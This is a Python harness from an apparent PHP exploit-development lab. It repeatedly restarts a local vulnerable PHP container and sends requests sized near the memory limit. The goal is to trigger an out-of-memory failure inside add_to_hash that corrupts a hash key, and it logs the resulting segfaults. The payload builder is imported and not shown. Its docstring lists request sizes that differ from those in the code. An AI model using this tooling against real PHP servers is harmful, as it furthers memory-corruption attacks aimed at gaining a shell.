#!/usr/bin/env python3
"""php2shell lab, oom16: boot-jitter grinder.

Evidence: build(65479) fataled once (09:03:09, docker logs) then survived on
a later boot. The OOM wall jitters a few KB per boot (mmap/ASLR layout). A
request in the jitter band crosses on SOME boots. Grinder: 60 boots x
{65479, 65475}, stop on key-death fingerprint (alloc<=360 = 328B key string
inside add_to_hash post-commit). Full fingerprint log either way.
"""
import re
import socket
import subprocess
import sys
import time

sys.path.insert(0, "/tmp/phplab")
from oom14 import build, restart, send, alloc_n

REMS = [65511, 65507, 65503, 65499, 65495]
BOOTS = 60

def segfault_lines():
    r = subprocess.run(["docker", "logs", "php_vuln", "--tail", "60"],
                       capture_output=True, text=True)
    txt = r.stdout + r.stderr
    return [l for l in txt.splitlines()
            if "Segmentation" in l or "SIGSEGV" in l or "exited on signal" in l]

def main():
    log = lambda *a: print(*a, flush=True)
    hits = 0
    for boot in range(1, BOOTS + 1):
        restart()
        for rem in REMS:
            fatal, text = send(8081, build(rem))
            a = alloc_n(text) if fatal else None
            if fatal:
                log(f"boot{boot} rem={rem}: fatal alloc={a}")
                if a is not None and a <= 360:
                    hits += 1
                    log(f"*** KEY DEATH boot={boot} rem={rem} alloc={a} ***")
                    time.sleep(2)
                    for h in segfault_lines():
                        log("SEGFAULT:", h)
                    log(f"hits={hits}")
                    if hits >= 3:
                        log("3 hits — stopping grinder")
                        return
            else:
                log(f"boot{boot} rem={rem}: survive")
    log(f"grinder done, key-death hits={hits}")

if __name__ == "__main__":
    main()
